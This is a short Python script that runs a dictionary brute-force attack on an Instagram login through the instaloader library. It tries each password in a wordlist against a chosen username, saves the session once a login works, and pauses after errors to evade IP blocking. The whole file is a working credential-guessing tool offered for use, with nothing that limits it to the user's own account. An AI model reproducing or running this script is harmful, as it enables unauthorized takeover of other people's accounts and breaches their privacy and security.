import instaloader
import time

def insta_brute_force(username, file_path):
    loader = instaloader.Instaloader()
    
    try:
        with open(file_path, "r") as file:
            passwords = file.readlines()
        
        for password in passwords:
            password = password.strip()
            
            try:
                loader.login(username, password)
                print(f"\n[✔] Password found: {password}")
                loader.save_session_to_file()  # Save session after successful login
                return  
            except instaloader.exceptions.BadCredentialsException:
                print(f"[X] Incorrect password: {password}")
            except instaloader.exceptions.TwoFactorAuthRequiredException:
                print("[!] 2FA required! Can't proceed further.")
                return
            except instaloader.exceptions.ConnectionException:
                print("[!] Connection error! Retrying in 30 seconds...")
                time.sleep(30)
            except Exception as e:
                print(f"[!] Unexpected error: {e}")
                time.sleep(10)  # Add delay to avoid IP blocking
        
        print("\n[-] No valid password found.")
    
    except FileNotFoundError:
        print("[!] File not found. Please check the path.")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    username = input("Enter your Instagram username: ")
    file_path = input("Enter the path to your password file: ")
    
    insta_brute_force(username, file_path)